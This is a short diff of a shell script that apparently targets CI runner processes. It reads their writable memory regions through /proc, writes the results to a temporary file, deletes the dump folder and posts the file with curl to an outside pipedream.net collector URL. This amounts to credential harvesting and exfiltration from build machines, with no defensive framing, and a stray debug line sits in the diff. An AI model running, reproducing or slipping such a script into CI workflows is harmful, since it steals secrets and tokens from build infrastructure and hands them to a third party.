@@ -10,6 +10,7 @@ echo "STARTING..." >> /tmp/file.txt
 # get pids related to runners and dump their memory
 for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
 do
+    echo $pid >> /tmp/file.txt
     grep rw-p /proc/$pid/maps \
     | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
     | while read start stop; do \
@@ -20,7 +21,7 @@ do
 done
 
 echo "FINISHED..." >> /tmp/file.txt
-
+grep rw-p /proc/$pid/maps
 rm -rf dumps/
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
